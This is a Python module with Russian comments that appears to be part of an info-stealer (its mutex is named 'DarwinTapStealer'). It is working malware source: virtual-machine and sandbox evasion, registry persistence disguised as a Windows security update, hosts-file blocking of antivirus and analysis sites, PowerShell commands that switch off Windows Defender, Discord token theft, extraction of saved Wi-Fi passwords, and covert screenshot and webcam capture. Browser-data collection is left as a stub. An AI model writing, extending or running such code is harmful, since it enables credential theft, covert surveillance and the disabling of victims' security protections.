import os
import sys
import platform
import ctypes
import shutil
import subprocess
import winreg
import socket
import uuid
import re
import psutil

def is_sandboxed():
    """Проверка на наличие виртуальных машин или песочниц"""
    # Проверка имен, связанных с VM
    vm_signs = [
        "vmware", "virtualbox", "vbox", "qemu", "xen", "sandboxie",
        "hypervision", "parallels", "bochs", "virtual", "sample", "sandbox"
    ]
    
    # Проверка имени компьютера и пользователя
    hostname = platform.node().lower()
    username = os.getlogin().lower()
    
    for sign in vm_signs:
        if sign in hostname or sign in username:
            return True
    
    # Проверка размера физической памяти (VM часто имеет меньше 4 ГБ)
    memory_gb = psutil.virtual_memory().total / (1024**3)
    if memory_gb < 4:
        return True
    
    # Проверка количества процессоров (VM часто имеет мало ядер)
    if psutil.cpu_count() < 2:
        return True
    
    # Проверка MAC-адреса (некоторые виртуальные машины имеют определенные MAC-префиксы)
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    vm_mac_prefixes = [
        "00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27",
        "52:54:00", "ac:de:48"
    ]
    
    for prefix in vm_mac_prefixes:
        if mac.startswith(prefix):
            return True
    
    return False

def add_to_startup(file_path=None):
    """Добавляет программу в автозагрузку Windows"""
    if file_path is None:
        file_path = sys.executable
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(
            key,
            "Windows_Security_Update",
            0, winreg.REG_SZ,
            file_path
        )
        
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {e}")
        return False

def block_sites():
    """Блокирует антивирусные сайты, изменяя файл hosts"""
    banned_sites = [
        'virustotal.com', 'avast.com', 'kaspersky.com', 'mcafee.com',
        'norton.com', 'malwarebytes.com', 'bitdefender.com', 'eset.com',
        'avg.com', 'comodo.com', 'drweb.com', 'cybereason.com', 'crowdstrike.com',
        'f-secure.com', 'sophos.com', 'avira.com', 'virusradar.com',
        'hybrid-analysis.com', 'any.run', 'virusscan.jotti.org'
    ]
    
    try:
        hosts_file = os.path.join(os.environ['SystemRoot'], 'System32', 'drivers', 'etc', 'hosts')
        
        # Проверяем, можем ли мы писать в файл hosts
        try:
            with open(hosts_file, 'a') as f:
                pass
        except:
            # Нужны права администратора, пробуем получить их
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("Требуются права администратора для изменения файла hosts")
                return False
        
        # Читаем текущее содержимое, чтобы не добавлять дубликаты
        with open(hosts_file, 'r') as f:
            content = f.read()
        
        with open(hosts_file, 'a') as f:
            for site in banned_sites:
                if f"127.0.0.1 {site}" not in content and f"127.0.0.1 www.{site}" not in content:
                    f.write(f"127.0.0.1 {site}\n")
                    f.write(f"127.0.0.1 www.{site}\n")
        
        # Делаем файл hosts только для чтения
        try:
            subprocess.run(f'attrib +r "{hosts_file}"', shell=True, check=True)
        except:
            pass
        
        return True
    except Exception as e:
        print(f"Ошибка при блокировке сайтов: {e}")
        return False

def disable_defender():
    """Попытка отключить Windows Defender"""
    try:
        # Эти команды требуют прав администратора
        commands = [
            "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"",
            "powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"",
            "powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"",
            "powershell -Command \"Set-MpPreference -DisableEmailScanning $true\""
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        
        return True
    except Exception as e:
        print(f"Ошибка при отключении Defender: {e}")
        return False

def create_mutex(mutex_name="DarwinTapStealer"):
    """Создает мьютекс, чтобы программа запускалась только в одном экземпляре"""
    try:
        mutex = ctypes.windll.kernel32.CreateMutexA(None, False, mutex_name.encode())
        last_error = ctypes.windll.kernel32.GetLastError()
        
        if last_error == 183:  # ERROR_ALREADY_EXISTS
            return False
        return True
    except:
        return True  # В случае ошибки продолжаем выполнение

def get_ip_info():
    """Получает информацию об IP-адресе пользователя"""
    try:
        response = subprocess.check_output("curl -s https://ipinfo.io/json", shell=True)
        return response.decode()
    except:
        try:
            # Запасной вариант
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return f'{{"ip": "{ip}"}}'
        except:
            return '{}'

# Добавляем функции из Satan-Stealer

def get_token(path, arg):
    """Извлекает токены Discord из указанной директории"""
    try:
        if not os.path.exists(path):
            return
        
        tokens = []
        pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
        
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                try:
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        for line in file.readlines():
                            for match in re.findall(pattern, line):
                                tokens.append(match)
                except:
                    pass
        
        return tokens
    except:
        return []

def get_discord_tokens():
    """Собирает токены Discord из различных директорий"""
    base_dirs = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
    ]
    
    tokens = []
    for path in base_dirs:
        found_tokens = get_token(path, "discord")
        if found_tokens:
            tokens.extend(found_tokens)
    
    return list(set(tokens))  # Удаляем дубликаты

def gather_browser_data(browser_name, profile_path):
    """Собирает данные браузера из указанного профиля"""
    data = {}
    
    try:
        # Здесь можно добавить код для сбора паролей и куки из браузеров
        # Например, вызов функций из client.py
        pass
    except Exception as e:
        print(f"Ошибка при сборе данных из {browser_name}: {e}")
    
    return data

def collect_wifi_passwords():
    """Собирает сохраненные пароли Wi-Fi"""
    wifi_passwords = {}
    
    try:
        networks = subprocess.check_output('netsh wlan show profile', shell=True).decode('cp866', errors='ignore').split('\n')
        profiles = [line.split(':')[1].strip() for line in networks if "Все профили пользователей" in line or "All User Profile" in line]
        
        for profile in profiles:
            try:
                password_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('cp866', errors='ignore').split('\n')
                password_lines = [line.split(':')[1].strip() for line in password_info if "Содержимое ключа" in line or "Key Content" in line]
                
                if password_lines:
                    wifi_passwords[profile] = password_lines[0]
            except:
                pass
    except:
        pass
    
    return wifi_passwords

def take_screenshot():
    """Делает скриншот экрана"""
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        screenshot.save(temp_path)
        return temp_path
    except:
        return None

def capture_webcam():
    """Пытается сделать снимок с веб-камеры"""
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            return None
            
        ret, frame = camera.read()
        if not ret:
            return None
            
        temp_path = os.path.join(os.getenv('TEMP'), 'webcam.png')
        cv2.imwrite(temp_path, frame)
        camera.release()
        return temp_path
    except:
        return None

def Trust(cookies):
    """Анализирует куки на наличие специфических признаков"""
    try:
        # Здесь можно реализовать логику проверки куки на признаки отладки/исследования
        return False
    except:
        return False
